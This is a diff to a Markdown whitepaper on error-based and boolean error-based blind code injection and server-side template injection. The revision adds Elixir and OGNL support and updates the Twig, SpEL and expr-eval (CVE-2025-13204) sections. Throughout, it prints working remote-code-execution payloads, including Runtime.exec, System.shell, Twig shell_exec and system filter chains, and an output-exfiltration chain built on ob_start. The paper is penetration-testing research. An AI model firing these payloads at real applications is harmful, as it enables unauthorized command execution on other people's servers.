@@ -1,11 +1,11 @@
 # Successful Errors: New Code Injection and SSTI Techniques
 
-![Report version](https://img.shields.io/badge/Report_version-1.0-blue)
-![Last modified](https://img.shields.io/badge/Last_modified-03.01.2026-blue)
+![Report version](https://img.shields.io/badge/Report_version-1.1-blue)
+![Last modified](https://img.shields.io/badge/Last_modified-22.02.2026-blue)
 
 > [!NOTE]
-> This is the first version of the whitepaper based on the results I had when I released SSTImap version 1.3.0.
-> Further improvements would be adapted for this format as version 1.1 of the research at a later date.
+> This is the second version of the whitepaper based on the results I presented before releasing SSTImap version 1.3.1.
+> Further improvements would be adapted for this format as version 1.2 of the research at a later date.
 
 - [Payloads](/Payloads.md)
 - [Printable whitepaper](/Successful%20Errors.pdf)
@@ -22,7 +22,7 @@ It might be mentioned a couple of times alongside payloads for very specific cas
 but it would not be tested for and the real potential of that technique might stay undiscovered for years.
 
 This research introduces two such techniques for Code Injection and SSTI: **Error-Based** and **Boolean Error-Based Blind**.
-I will provide payloads for Code Injection and SSTI in five programming languages: Python, PHP, Java, Ruby and NodeJS.
+I will provide payloads for Code Injection and SSTI in six programming languages: Python, PHP, Java, Ruby, NodeJS and Elixir.
 Moreover, I will provide universal detection payloads, capable of quickly detecting even blind injections.
 
 I will provide the full timeline of my research from finding the early breadcrumbs to the eventual conclusions.
@@ -38,13 +38,14 @@ Additionally, all provided payloads were added to the open-source tool SSTImap, 
   - [Dust.JS](#dustjs)
   - [Twig](#twig-cve-2022-23614) (CVE-2022-23614)
   - [JSONPath Plus](#jsonpath-plus-cve-2025-1302) (CVE-2025-1302)
-  - [expr-eval](#expr-eval)
+  - [expr-eval](#expr-eval-cve-2025-13204) (CVE-2025-13204)
 - [Error-Based SSTI](#error-based-ssti)
   - [Python](#python)
   - [PHP](#php)
   - [Java](#java)
   - [Ruby](#ruby)
   - [NodeJS](#nodejs)
+  - [Elixir](#elixir)
   - [Generic Detection](#generic-detection)
   - [Payload Development](#payload-development)
 - [Boolean Error-Based Blind SSTI](#boolean-error-based-blind-ssti)
@@ -54,10 +55,11 @@ Additionally, all provided payloads were added to the open-source tool SSTImap, 
   - [Java](#java-1)
   - [Ruby](#ruby-1)
   - [NodeJS](#nodejs-1)
+  - [Elixir](#elixir-1)
   - [Generic Detection](#generic-detection-1)
   - [Payload Development](#payload-development-1)
 - [Practical Application](#practical-application)
-  - [expr-eval](#expr-eval-1)
+  - [expr-eval](#expr-eval-cve-2025-13204-1) (CVE-2025-13204)
   - [JSONPath Plus](#jsonpath-plus-cve-2025-1302-1) (CVE-2025-1302)
   - [Twig](#twig-cve-2022-23614-1) (CVE-2022-23614)
   - [Dust.JS](#dustjs-1)
@@ -100,7 +102,7 @@ so techniques and payloads are only documented for specific vulnerability exampl
 
 Lack of the more universal detection techniques for Code Injection and SSTI leads to the inefficiency of the black box scanning for blind code and template injections.
 
-In this research, two new techniques will be provided for Code Injection and SSTI, as well as payloads for five programming languages and generic detection payloads.
+In this research, two new techniques will be provided for Code Injection and SSTI, as well as payloads for six programming languages and generic detection payloads.
 Provided techniques will extend the capabilities of the blind SSTI exploitation, as well as allowing blind Code Injection and SSTI scanning without guessing the programming language of the injected code.
 
 Payloads, provided in this research, are aimed at practical penetration testing of real-life web applications.
@@ -164,13 +166,13 @@ This method is far from being a universal way of accessing the output as it heav
 I researched other potential ways of extracting the output, such as prototype pollution, but I was unable to discover a more universal technique.
 Despite that, this time I was able to extract the output from the condition.
 
-### expr-eval
+### expr-eval (CVE-2025-13204)
 Unlike all previous cases, where the limitations were encountered during payload development, the last breadcrumb leading to this research was discovered while exploring a real-world application.
 I was testing a no-code bot constructor for Discord, which allowed users to customize message templates.
 By itself the template engine used for that purpose was not evaluating any code, but it had a dedicated tag for evaluating mathematical expressions.
 
 By examining different error messages returned by that tag, I determined that the expressions were evaluated using Node.JS module called **expr-eval**.
-This module allows RCE through access to the Object constructor which allows arbitrary property access.
+This module allows RCE through access to the Object constructor which allows arbitrary property access (CVE-2025-13204).
 I modified the payload to avoid breaking the syntax of the template tag, but instead of code execution results I only got `NaN`.
 
 ![Payload returned NaN](/images/Breadcrumbs_expr-eval_NaN.png)
@@ -217,7 +219,7 @@ In order to make my payloads more universal for better coverage, I decided to fo
 
 Therefore, for SSTI and Code Injection exploitation using this technique I had to find error messages that reflect user-supplied data.
 In most cases, Code Injection payloads could be used to exploit SSTI by wrapping the payloads with template tags.
-As part of this research, I would cover payloads for four programming languages: Python, PHP, Ruby and NodeJS, as well as for template engines supported by SSTImap, if such payloads significantly differ from the payloads of the corresponding programming language.
+As part of this research, I would cover payloads for five programming languages: Python, PHP, Ruby, NodeJS and Elixir, as well as for template engines supported by SSTImap, if such payloads significantly differ from the payloads of the corresponding programming language.
 Additionally, payloads for Java-based template engines, as well as universal detection payloads would be covered by this paper.
 
 ### Python
@@ -256,14 +258,21 @@ This payload works in almost all of the tested template engines: `fopen(OUTPUT, 
 Additionally, I found `include()` function which triggered a similar error.
 Payload `include(OUTPUT)` or a similar one could be used in most of the template engines that provide template inheritance capabilities.
 
-![PHP payload and error](/images/Error-Based_PHP_include.png)
+Payloads using `fopen()` and `include()` failed in some cases.
+It turned out that those functions cause PHP **Warnings** which could be rendered inside the template output that we have no access to.
+
+I decided to modify the first payload using `call_user_func()` to call a string as a function without using PHP-specific syntax.
+As a result, I got the payload: `call_user_func(OUTPUT)`, which triggers a **fatal error**, interrupting rendering and reflecting the error message directly on the page.
+
+![PHP payload and error](/images/Error-Based_PHP_call_user_func.png)
 
 Commonly used for RCE, `system()` function prints the output to the page, but only returns the first line of the result.
 To capture the full output I decided to use `shell_exec()`.
 This function accepts exactly one argument, so it worked well for most of the template engines, including old versions of **Twig**:
 
 ```php
-{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%set OUTPUT=_self.env.getFilter("ls -la")%}
+{{_self.env.registerUndefinedFilterCallback("shell_exec")}}
+{%set OUTPUT=_self.env.getFilter("ls -la")%}
 ```
 
 For newer Twig versions I used `|map` filter to preserve the output, but it passed array index as the second element, which made directly using `shell_exec()` function impossible.
@@ -273,20 +282,38 @@ To bypass that limitation I used `call_user_func()` function to call `shell_exec
 {% set OUTPUT={"ls -la": "shell_exec"}|map("call_user_func")|join %}
 ```
 
-To trigger the error in Twig and get the execution results we can use the payload that triggers the nonexistent function: `{{ [0]|map(OUTPUT) }}` or includes the nonexistent file: `{% include(OUTPUT) %}`
+To trigger the error in Twig and get the execution results we can use the **fatal error** payload that triggers the nonexistent function: `{{ [0]|map(OUTPUT) }}` or includes the nonexistent file: `{% include(OUTPUT) %}`
 
 ![Twig error message](/images/Error-Based_PHP_Twig.png)
 
 ### Java
 Java does not provide a universal built-in code evaluation functionality, so there are no universal payloads for Java.
-Instead, expression languages, such as **Spring Expression Language**.
+Instead, expression languages, such as **Spring Expression Language** (**SpEL**).
 For that language it is possible to use a simple trick of converting a string to a number:
 
 ```java
-"".getClass().forName('java.lang.Integer').valueOf("test")
+"".getClass().forName('java.lang.Integer').valueOf(OUTPUT)
+```
+
+This payload will also work for other similar Expression Languages.
+To check for the **SpEL** syntax, we can use SpEL-specific way of accessing classes: `T(java.lang.Integer).valueOf(OUTPUT)`
+
+To get the results of OS command execution as a string we can use the payload:
+
+```java
+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec("…").inputStream.readAllBytes())
 ```
 
 ![SpEL error message](/images/Error-Based_Java_SpEL.png)
+
+Another common expression language used in Java is **OGNL**.
+This language triggers an error containing user-supplied string when that string is used in an arithmetical operation: `OUTPUT/0`
+
+RCE result could be converted to string using this payload:
+
+```java
+new String(@java.lang.Runtime@getRuntime().exec("…").inputStream.readAllBytes())
+```
 
 I also created payloads for two Java-based template engines supported by SSTImap.
 
@@ -310,7 +337,14 @@ Payload for **Ruby** could be used for both Code Injection and SSTI and uses the
 For Error-Based Code Injection in **NodeJS** it is possible to trigger the error by including a nonexistent module using `require()` function, if it is accessible in the injection context: `require(OUTPUT)`
 
 Alternatively, JavaScript triggers a reflecting error by accessing a property of `undefined`: `""["x"][OUTPUT]`
- 
+
+### Elixir
+**Elixir** programming language reflects the string inside an error message when that string is used as a list index instead of an `atom` object: `[1, 2][OUTPUT]`
+
+The result of the OS command execution could be reflected using `[1, 2][elem(System.shell(" … "), 0)]`
+
+![Elixir error message](/images/Error-Based_Elixir.png)
+
 ### Generic Detection
 For Error-Based detection of SSTI and Code Injection we need a payload that would trigger an error in any programming language.
 In that case, it would be possible to detect the programming language by a typical error message or at least find the keywords indicating the presence of an error, if the programming language is not supported yet.
@@ -403,7 +437,7 @@ Parameters are considered stable if they stay the same for all responses or if t
 ### Python
 To determine the truthfulness of the injection results we could use the division by a Boolean value.
 Truthful value would be converted to one, which does not trigger an error, while values evaluating to False would trigger division by zero error.
-We could use this expression as our payload: `1 / ( RESULT )`
+We could use this expression as our payload: `1 / ( OUTPUT )`
 
 To detect the injection these two payload pairs could be used:
 
@@ -453,7 +487,7 @@ For **Spring Expression Language** I used the same idea as before, but it requir
 
 Ternary operator is used to convert the result to `0` or `1`, and the concatenation of an empty string is used in order to avoid errors caused by incorrect return type.
 
-For detection payloads I replaced `1` with `"".getClass().forName('java.lang.Integer').valueOf('1')`, which allows us to confirm that the injection supports **SpEL** code.
+For detection payloads I replaced `1` with `"".getClass().forName('java.lang.Integer').valueOf('1')`, which allows us to confirm that the injection supports **Java** code.
 For my two pairs of detection payloads, I used simple integer additions, checking for integer overflow in the second pair.
 
 OS command execution was checked by comparing the return code of `waitFor()` function with zero:
@@ -462,7 +496,27 @@ OS command execution was checked by comparing the return code of `waitFor()` fun
 "".getClass().forName('java.lang.Runtime').getRuntime().exec(" … ").waitFor()==0
 ```
 
+These payloads would also work for other similar Expression Languages.
+To make sure that we have **SpEL** injection, we can replace them with SpEL-specific payloads: `T(java.lang.Integer).valueOf('1')` and `T(java.lang.Runtime).getRuntime().exec("…").waitFor()==0`
+
 ![SpEL error](/images/Boolean-Based_Java_SpEL.png)
+
+Payloads for **OGNL** expressions are similar to **SpEL** payloads.
+I used the same payload pairs using integer additions as well as the same oracle: `1/((…)?1:0)+""`
+
+**OGNL** syntax can be confirmed by replacing `1` with `@java.lang.Integer@valueOf('1')`
+
+Similarly to **SpEL**, you can get the return code of OS commands using `waitFor()`:
+
+```java
+@java.lang.Runtime@getRuntime().exec("…").waitFor()==0
+```
+
+It is also worth mentioning that **OGNL** has an unusual way of implicitly converting types.
+Besides the order of operations, previously computed values also affect the conversions.
+While a payload like `1 * (123 + 456) + "abc" + 1 * (123 + 456)` will get the expected result of `"579abc579"`, a similar payload `(123 + 456) + "abc" + (123 + 456)` will start converting integers to strings, returning `"579abc123456"`
+
+![OGNL error](/images/Boolean-Based_Java_OGNL.png)
 
 Main payload for **Freemarker** was already created by Nicolas Verdier [^10]:
 
@@ -521,6 +575,17 @@ Code evaluation could be checked directly using `eval()`, and the return code of
 require('child_process').spawnSync( … , options={shell:true}).status===0
 ```
 
+### Elixir
+**Elixir** allows using division by zero as an oracle, but requires explicit conversion to integer.
+As a result, we can use the payload: `1/(( … )&&1||0)`
+
+We can check for **Elixir** syntax using these pairs of payloads:
+
+- `String.length("2") == 1` and `String.length("1") == 2`
+- `is_boolean(false) == true` and `is_boolean(true) == false`
+
+Checking `eval()` code evaluation results and comparing OS command return code could be done directly using these payloads: `elem(Code.eval_string( … ), 0)` and `elem(System.shell( … ), 1) == 0`
+
 ### Generic Detection
 All programming languages have their own function names, so it is impossible to find a function that would work for generic detection.
 Despite that, almost all languages use exactly the same syntax for basic mathematical operations.
@@ -549,7 +614,7 @@ Moreover, I applied those techniques to my own tasks, which allowed me to get th
 
 Among those cases there are examples of testing real web applications, as well as payloads that extend the capabilities of known vulnerability exploitation.
 
-### expr-eval
+### expr-eval (CVE-2025-13204)
 The first example of applying new techniques to a real-world target was the Code Injection vulnerability in a popular bot constructor for Discord.
 One of the tags in the template engine allowed mathematical expression evaluation using a vulnerable NodeJS module called **expr-eval**, but the result was converted to the integer, which initially prevented me from accessing the result of the injected code.
 
@@ -583,10 +648,27 @@ We can compare the first element with the expected value to determine if the ele
 As a result, we get this payload:
 
 ```php
-{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %}{{ 1 / ([" … >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }}
+{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %}
+{{ 1 / ([" … >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }}
 ```
 
 This time, Boolean Error-Based Blind extends the capabilities of blind sandbox bypass in **Twig** template engine, potentially allowing bit-by-bit extraction of the output.
+
+We can also notice that PHP functions like `system()` and `passthru()` output the results directly to the page which allows us to intercept them using `ob_start()`.
+
+As a second argument, `ob_start()` accepts the name of the function that would be called with our output as an argument.
+This allows us to use `call_user_func()` for Error-Based output exfiltration.
+
+To call our function and trigger an error, we need to trigger `ob_end_flush()` with no arguments.
+To do that, we can use `call_user_func_array()` with an empty array.
+Our final payload:
+
+```php
+{% set a = ["error_reporting", "1"]|sort("ini_set") %}
+{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}
+{{ ["ls", 0]|sort("system") }}
+{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%}
+```
 
 ### Dust.JS
 Additionally, I would like to mention payloads for **Dust.JS** template engine.
@@ -610,7 +692,7 @@ As part of this research, two new techniques for Code Injection and SSTI were de
 Using **Error-Based** technique allows the results of blind injection to be accessed if verbose error messages are displayed to the user.
 **Boolean Error-Based Blind** technique greatly speeds up exploitation of blind injections, as it eliminates delays commonly used with **Time-Based Blind** technique.
 
-Payloads were created for both new techniques which allow exploitation of Code Injection and SSTI in five programming languages.
+Payloads were created for both new techniques which allow exploitation of Code Injection and SSTI in six programming languages.
 
 Additionally, context-aware payloads for generic detection of Code Injection and SSTI were introduced, which allowed for automated detection of blind injections without testing for all possible languages, which was previously considered impossible.
 
